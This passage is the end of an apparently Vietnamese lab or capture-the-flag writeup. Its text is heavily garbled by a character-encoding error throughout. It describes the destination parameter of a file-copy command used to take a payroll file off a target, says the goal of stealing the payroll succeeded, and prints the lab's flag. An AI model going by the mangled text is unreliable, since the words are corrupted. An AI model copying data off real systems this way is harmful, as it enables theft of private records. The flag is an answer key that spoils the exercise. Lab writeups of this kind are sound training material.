- `user@remote_host:/path/to/destination`: Th√¥ng tin ƒëƒÉng nh·∫≠p v√† ƒë∆∞·ªùng d·∫´n ƒë·∫øn th∆∞ m·ª•c ƒë√≠ch tr√™n m√°y t·ª´ xa.

![Untitled](img/Untitled%2033.png)

![Untitled](img/Untitled%2034.png)

Ch√∫ng ta ƒë·ªçc ƒë∆∞·ª£c b·∫£ng thanh to√°n l∆∞∆°ng, c√≥ th·ªÉ chuy·ªÉn file ra win ƒë·ªÉ ƒë·ªçc thay v√¨ ƒë·ªçc ·ªü linux. V·∫≠y c√¥ng vi·ªác c·ªßa ch√∫ng ta ƒë√£ ho√†n th√†nh, m·ª•c ti√™u l·∫•y b·∫£ng l∆∞∆°ng th√†nh c√¥ng.

**Flag: CBJS{c6e03477479e4f5b35767775e78c925a} [Flag ·ªü trong m√£ giao d·ªãch]**

## Conclusion

Ch√∫ng ta ƒë√£ ho√†n th√†nh m·ª•c ti√™u ƒë·ªÅ ra, qua b√†i lab n√†y gi√∫p ch√∫ng ta c·∫£i thi·ªán k·ªπ nƒÉng v√† t∆∞ duy c·ªßa ch√∫ng ta h∆°n. C·∫£m ∆°n m·ªçi ng∆∞·ªùi ƒë√£ ƒë·ªçc writeup!